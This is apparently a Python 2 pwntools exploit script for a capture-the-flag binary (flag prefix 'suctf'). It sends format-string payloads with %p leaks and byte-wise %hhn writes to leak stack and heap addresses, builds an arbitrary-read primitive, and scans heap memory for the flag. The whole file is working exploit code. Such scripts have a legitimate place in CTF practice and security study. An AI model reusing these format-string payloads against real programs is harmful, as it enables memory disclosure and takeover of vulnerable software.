#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    #libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    #libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    #libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

passed = 0

def write_addr(addr, value, tot, index):
    global passed
    addr_ls = [addr, addr + 1, addr + 2, addr + 3, addr + 4, addr + 5]
    value_ls = [value & 0xff, (value >> 8) & 0xff, (value >> 16) & 0xff,
                (value >> 24) & 0xff, (value >> 32) & 0xff, (value >> 40) & 0xff]
    payload = ''
    passed &= 0xff
    for i in range(tot):
        now = (value_ls[i] - passed + 0x100) & 0xff
        if now == 0:
            now = 0x100
        payload += '%{}c%{}$hhn'.format(now, index + i)
        passed = value_ls[i]
    return payload

def read_addr(target_addr):
    index1 = 6
    index2 = 14
    value_ls = map(ord, p32(target_addr))
    low_byte = stack_addr & 0xff
    for i in range(4):
        payload = '%{}c%{}$hhn\n\x00'.format(low_byte + i, index1)
        p.s(payload)
        p.rl()
        payload = '%{}c%{}$hhn\n\x00'.format(value_ls[i], index2)
        p.s(payload)
        p.rl()
    success('target ' + hex(target_addr))
    payload = '%26$p\n\x00'
    #payload = '%33$s'
    #bc('printf')
    p.s(payload)
    p.rl()
    payload = '%26$s\n\x00'
    p.s(payload)

if __name__ == '__main__':
    p.ru('=\n')

    '''
    payload = '.%6$s.'
    p.sl(payload)
    p.rl()
    gogogo()
    p.i()
    '''

    payload = '.%14$p.%18$p.\x00'
    p.sl(payload)
    p.ru('.')
    stack_addr = int(p.ru('.', drop=True), 16)
    heap_addr = int(p.ru('.', drop=True), 16)
    success('stack ' + hex(stack_addr))
    success('heap ' + hex(heap_addr))
    #heap_addr = (heap_addr >> 12) << 12;
    success('heap ' + hex(heap_addr))
    for i in range(-0x800, 0, 0x8):
        success('offset ' + hex(i))
        read_addr(heap_addr + i)
        ret = p.rl()
        if 'suctf' in ret:
            print(ret)
            p.i()
    p.i()
